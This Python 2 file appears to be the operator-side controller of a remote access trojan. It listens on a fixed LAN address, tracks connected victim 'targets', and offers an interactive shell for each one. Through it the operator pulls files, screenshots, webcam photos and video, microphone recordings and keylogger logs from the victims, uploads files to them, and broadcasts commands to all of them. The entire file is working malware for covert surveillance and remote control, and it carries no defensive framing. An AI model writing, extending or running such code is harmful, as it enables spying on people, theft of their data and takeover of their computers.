import socket
import subprocess
import json
import time
import base64
import threading
from time import strftime
from os import path,mkdir

count = 0

def sendtoall(target,data):
    json_data = json.dumps(data)
    target.send(json_data)


def shell(target,ip):
    global count

    def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data)

    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + target.recv(1024)
                return json.loads(data)
            except ValueError:
                continue
            
    while True:
        command = raw_input("shell#~%s: "%str(ip))
        reliable_send(command)

        if command == "exit":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break

        elif command == "help":
            help = reliable_recv()
            print help
            
        elif command[:2] == 'cd' and len(command) >1:
            continue
        elif command[:8] == 'download':
            with open(command[9:],"wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            try:
                with open(command[7:],'rb') as file1:
                    reliable_send(base64.b64encode(file1.read()))
            except:
                failed = "Falied to upload...."
                reliable_send(base64.b64encode(failed))
                
        elif command[:10] == 'screenshot':
             with open("screenshot%d.png" % count,"wb") as screen:
                 image = reliable_recv()
                 image_decoded = base64.b64decode(image)
                 screen.write(image_decoded)
                 count+=1
        elif command[:9] == "wallpaper":
            print "upload the image to the AppData/Roaming Directory with the name wall.jpg"
            wall = reliable_recv()
            print wall

        elif command[:10] == 'killcursor':
            cursor = reliable_recv()
            print cursor
        
        elif command == 'voicerec':
            with open("recording%d.wav" % count,"wb") as rec:
                 audio = reliable_recv()
                 image_decoded = base64.b64decode(audio)
                 rec.write(image_decoded)
                 count+=1
        elif command == "playaud":
            aud = reliable_recv()
            print aud
        elif command == 'webcam':
            with open("camera%d.png" % count,"wb") as cam:
                 image = reliable_recv()
                 image_decoded = base64.b64decode(image)
                 cam.write(image_decoded)
                 count+=1
        elif command == 'wcvid':
            with open("camvid%d.mp4" % count,"wb") as vid:
                 image = reliable_recv()
                 image_decoded = base64.b64decode(image)
                 vid.write(image_decoded)
                 count+=1
        
        elif command[:5] == 'start':
            x =reliable_recv()
            print x

        elif command[:8] == "shutdown":
            continue
        elif command[:7] == "restart":
            continue
        elif command[:2] == 'os':
            os = reliable_recv()
            print os
        elif command[:12] == "keylog_start":
            continue
        elif command[:11] =="keylog_dump":
            with open("log%d.txt" % count,"wb") as lg:
                key = reliable_recv()
                lg.write(key)
                count+=1

        elif command[:9] == "privilige":
            state = reliable_recv()
            print state
        else:
            result = reliable_recv()
            print result


def server():
    global clients
    while True:
        if stop_threads:
            break
        s.settimeout(1)
        try:
            target,ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + "____" + str(ips[clients]) + "Has Connected:")
            clients +=1
        except:
            pass

global s
ips = []
targets = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("192.168.43.150",54321))
s.listen(5)

clients = 0
stop_threads = False

print "Waiting for Targets to Connect......"

t1  =threading.Thread(target=server)
t1.start()

while True:
    command = raw_input("--center--: ")
    if command == "targets":
        count = 0
        for ip in ips:
            print("session " + str(count) + "<--->" + str(ip))
            count+=1

    elif command[:7] == "session":
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            shell(tarnum,tarip)

        except Exception as e:
            print e

    elif command == "end":
        length_of_targets = len(targets)
        i = 0
        while i < length_of_targets:
            targetnumber = targets[i]
            print targetnumber
            sendtoall(targetnumber,"exit")
            i+=1
        s.close()
        stop_threads = True
        t1.join()
        break

    elif command[:7] =="sendall":
        length_of_targets = len(targets)
        i = 0
        try:
            while i < length_of_targets:
                targetnumber = targets[i]
                print targetnumber
                sendtoall(targetnumber,command)
                i+=1
        except:
            print " Failed to connect to all targets"